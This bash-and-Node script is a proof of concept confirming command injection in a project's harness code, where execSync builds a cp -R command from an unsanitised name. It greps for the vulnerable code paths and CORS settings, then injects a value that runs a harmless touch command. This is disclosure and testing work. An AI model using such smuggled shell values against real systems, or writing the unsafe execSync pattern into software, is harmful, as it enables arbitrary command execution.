#!/usr/bin/env bash
set -euo pipefail

ZIP="modern-web-guidance-src-main.zip"
DIR="modern-web-guidance-src-main"
MARKER="/tmp/mwg_cmdinj_confirmed_$$"

echo "[*] Cleaning old files..."
rm -rf "$DIR"
rm -f "$MARKER"

echo "[*] Extracting zip..."
unzip -q "$ZIP"

cd "$DIR"

echo "[*] Checking vulnerable code paths..."
grep -n "Access-Control-Allow-Origin.*\\*" eval-view/server.js
grep -n "Access-Control-Allow-Private-Network" eval-view/server.js
grep -n "/api/eval-launch" eval-view/server.js
grep -n "spawn('pnpm'" eval-view/server.js
grep -n 'execSync(`cp -R' harness/lib/agent-shared.ts

echo
echo "[*] Running safe local command-injection confirmation..."
node - "$MARKER" <<'NODE'
const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");

const marker = process.argv[2];

const workDir = fs.mkdtempSync("/tmp/mwg-work-");
const sourceDir = path.join(workDir, "source");
fs.mkdirSync(sourceDir, { recursive: true });
fs.writeFileSync(path.join(sourceDir, "proof.txt"), "safe proof\n");

// Same attacker-controlled flow:
// options.name -> testID -> targetDir -> execSync shell string
const attackerName = `poc"; touch ${marker}; #`;
const targetDir = path.join("/tmp/mwg-results", attackerName);

// Exact vulnerable command pattern from harness/lib/agent-shared.ts
const cmd = `cp -R "${sourceDir}/." "${targetDir}/"`;

console.log("[*] Built command:");
console.log(cmd);

try {
  execSync(cmd, { shell: "/bin/sh", stdio: "pipe" });
} catch (e) {
  // cp may fail, but injected touch can still execute before shell exits
}

if (fs.existsSync(marker)) {
  console.log("\n[+] VULNERABLE CONFIRMED");
  console.log("[+] Marker created:", marker);
  process.exit(0);
}

console.log("\n[-] Not confirmed. Marker was not created.");
process.exit(1);
NODE

echo
echo "[*] Verify:"
ls -l "$MARKER"
